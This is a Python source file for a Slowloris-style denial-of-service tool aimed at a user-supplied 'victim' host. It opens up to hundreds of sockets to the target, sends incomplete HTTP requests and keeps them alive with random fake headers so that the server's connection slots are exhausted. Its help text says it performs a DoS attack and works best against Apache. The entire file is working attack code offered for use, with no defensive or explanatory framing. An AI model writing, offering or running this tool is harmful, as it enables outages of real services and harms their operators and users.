import socket, time, argparse, sys, random
from typing import Type
from helper import *

VICTIM, PORT, SOCKET_COUNT = None, None, None
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"

sockets = []

parser = argparse.ArgumentParser(description="Perform Denial of Service attack", epilog="This attack works best with servers running Apache.")
parser.add_argument("victim", nargs="?", help="The IP address of the host to attack.")
parser.add_argument("-p", "--port", default=80, type=int, help="The port to send the requests to.")
parser.add_argument("-s", "--sockets", default=500, type=int, help="The number of sockets to be created. Minimum should be 200.")
args = parser.parse_args()

def validate_input():
    global VICTIM, PORT, SOCKET_COUNT
    if len(sys.argv) < 2:
        parser.print_help()
        exit(1)
    
    if not args.victim:
        print(error("\nYou have to specify a victim to attack.\n"))
        parser.print_help()
        exit(1)

    VICTIM = args.victim.replace(';', '_') 
    if not valid_victim(args.victim):
        print(error("The IP/host is not valid. Try again."))
        exit(1)

    PORT = args.port
    SOCKET_COUNT = args.sockets

def create_socket():
    global sockets

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((VICTIM, PORT))
    s.settimeout(2)

    send_data(s, "GET /1 HTTP/1.1")
    send_data(s, f"User-Agent: {USER_AGENT}")

    return s

def main():
    global sockets
    print(f"Creating {SOCKET_COUNT} sockets...", end=" ")
    for _ in range(SOCKET_COUNT):
        try:
            s = create_socket()
        except socket.error as e:
            print(error(f"[-] Error: {e}"))
            break 
        else:
            sockets.append(s)
    else:
        print(success("Done.")) 
        print("Press Ctrl+C to stop the attack.")

    while True:
        try:
            print(f"Sending requests to {VICTIM} on port {PORT}.")
            for s in sockets:
                try:
                    send_data(s, f"X-a: {random.randint(0, 10000)}") 
                except TypeError as e:
                    print(error(f"Error: {e}"))
                except socket.error as e:
                    sockets.remove(s)
            
            broken_sockets = SOCKET_COUNT - len(sockets)
            if broken_sockets:
                print(f"Recreating {broken_sockets} broken sockets:", end=" ")
            
            for _ in range(broken_sockets):
                try:
                    s = create_socket()
                    if s:
                        sockets.append(s)
                except socket.error as e:
                    print(error(f"\n[-] Error: {e}"))
            else:
                if broken_sockets:
                    print("Done.")

            time.sleep(3)

        except KeyboardInterrupt:
            print("\nHalting the DOS attack.\n")
            for s in sockets:
                s.close()
            del sockets
            print(success("Bye!"))
            exit()

if __name__ == "__main__": 
    validate_input()
    main()
